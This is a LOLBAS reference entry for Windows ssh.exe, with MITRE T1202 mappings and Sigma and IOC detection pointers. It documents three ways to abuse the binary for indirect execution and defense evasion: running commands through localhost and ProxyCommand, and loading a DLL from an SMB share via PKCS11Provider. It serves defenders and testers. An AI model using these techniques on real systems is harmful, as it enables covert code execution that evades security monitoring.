---
Acknowledgement:
- Person: Akshat Pradhan
- Person: Felix Boulet
- Person: Edo Mal
Author: Akshat Pradhan
Code_Sample:
- Code: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
Commands:
- Category: Execute
  Command: ssh localhost "{CMD}"
  Description: Executes specified command on host machine. The prompt for password
    can be eliminated by adding the host's public key in the user's authorized_keys
    file. Adversaries can do the same for execution on remote machines.
  MitreID: T1202
  OperatingSystem: Windows 10 1809, Windows Server 2019
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execute specified command, can be used for defense evasion.
- Category: Execute
  Command: ssh -o ProxyCommand="{CMD}" .
  Description: Executes specified command from ssh.exe
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: Execute
  Command: ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
  Description: Executes a DLL from an SMB share by abusing the PKCS11Provider option.
    The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList
    to prevent premature termination by `ssh.exe`. Note that all backslashes should
    be escaped (i.e. every `\` should be turned into `\\`).
  MitreID: T1202
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Performs indirect execution of a specified DLL from a remote share, can
    be used for defense evasion.
Created: 2021-11-08
Description: Ssh.exe is the OpenSSH compatible client can be used to connect to Windows
  10 (build 1809 and later) and Windows Server 2019 devices.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml
- IOC: Event ID 4624 with process name C:\Windows\System32\OpenSSH\sshd.exe.
- IOC: command line arguments specifying execution.
Full_Path:
- Path: c:\windows\system32\OpenSSH\ssh.exe
Name: ssh.exe
Resources:
- Link: https://gtfobins.github.io/gtfobins/ssh/
- Link: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
mitre_data:
  technique_ids:
  - T1202
tags:
- lolbas/osbinaries
---

# ssh.exe

Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.

# Path(s)

- `c:\windows\system32\OpenSSH\ssh.exe`

# Execute Commands

Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.

```batch
ssh localhost "{CMD}"
```

- **Usecase:** Execute specified command, can be used for defense evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10 1809, Windows Server 2019



Executes specified command from ssh.exe

```batch
ssh -o ProxyCommand="{CMD}" .
```

- **Usecase:** Performs execution of specified file, can be used as a defensive evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10



Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by `ssh.exe`. Note that all backslashes should be escaped (i.e. every `\` should be turned into `\\`).

```batch
ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
```

- **Usecase:** Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://gtfobins.github.io/gtfobins/ssh/
- https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
# Acknowledgements

- Akshat Pradhan (Authored, 2021-11-08)
- Akshat Pradhan
- Felix Boulet
- Edo Mal